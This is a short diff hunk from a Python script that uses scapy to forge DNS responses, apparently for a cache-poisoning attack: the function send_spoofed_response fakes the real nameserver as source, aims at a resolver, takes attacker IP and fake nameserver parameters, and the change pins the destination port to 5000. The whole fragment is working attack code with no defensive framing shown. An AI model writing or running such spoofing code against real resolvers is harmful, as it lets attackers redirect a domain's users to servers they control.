@@ -8,7 +8,7 @@ from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sr1
 def send_spoofed_response(resolver_ip, real_ns_ip, target_domain, random_subdomain, attacker_ip, fake_ns_domain):
     """Crafts and sends one spoofed DNS response packet."""
     spoofed_response = IP(src=real_ns_ip, dst=resolver_ip) / \
-                       UDP(sport=53, dport=random.randint(1024, 65535)) / \
+                       UDP(sport=53, dport=5000) / \
                        DNS(
                            id=random.randint(1, 65535),
                            qr=1, aa=1,
